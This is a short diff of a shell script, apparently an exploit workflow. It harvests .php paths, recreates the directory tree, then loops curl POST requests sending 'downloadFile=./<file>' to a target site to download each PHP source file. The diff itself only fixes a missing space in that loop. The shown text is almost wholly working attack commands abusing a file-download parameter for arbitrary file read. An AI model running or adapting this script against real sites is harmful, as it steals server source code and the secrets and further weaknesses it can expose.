@@ -38,7 +38,7 @@ grep -aEoR '[^[:space:]]+\.php(?:\/[^[:space:]]+)*' * 2>&- | awk -F'.php:' '{pri
 for _dir in $(cat _php-files);do dirname $_dir ;done | sort -u | xargs -I@ sh -c "mkdir -p $PWD/@"
 
 # 3°
-for _file in$(cat _php-files);do curl -Lsk https://example.com/ -XPOST -d "downloadFile=./$_file" -o "$PWD/$_file"; done
+for _file in $(cat _php-files);do curl -Lsk https://example.com/ -XPOST -d "downloadFile=./$_file" -o "$PWD/$_file"; done
 
 # 4°
 grep -aEoR '[^[:space:]]+\.php(?:\/[^[:space:]]+)*' * 2>&- | awk -F'.php:' '{print $2}' | cut -d"'" -f2 | cut -d'"' -f2 | sort -u > _php-files
